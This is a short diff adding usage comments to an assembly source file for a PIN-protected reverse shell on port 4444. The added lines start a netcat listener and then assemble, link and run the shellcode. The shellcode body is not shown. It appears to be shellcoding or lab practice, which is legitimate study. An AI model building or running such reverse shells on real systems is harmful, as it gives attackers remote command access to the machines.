@@ -1,4 +1,12 @@
 ;reverseshell which connects back on port 4444 if the correct PIN code 1234 is submitted.
+; HOW TO:
+; start netcat listener
+; nc -l 127.0.0.1 4444
+
+; assemble, link and run the reverse shellcode
+; nasm -felf64 reverseshell.nasm -o reverseshell.o
+; ld reverseshell.o -o reverseshell
+; ./reverseshell
 
 global _start:
 section .text
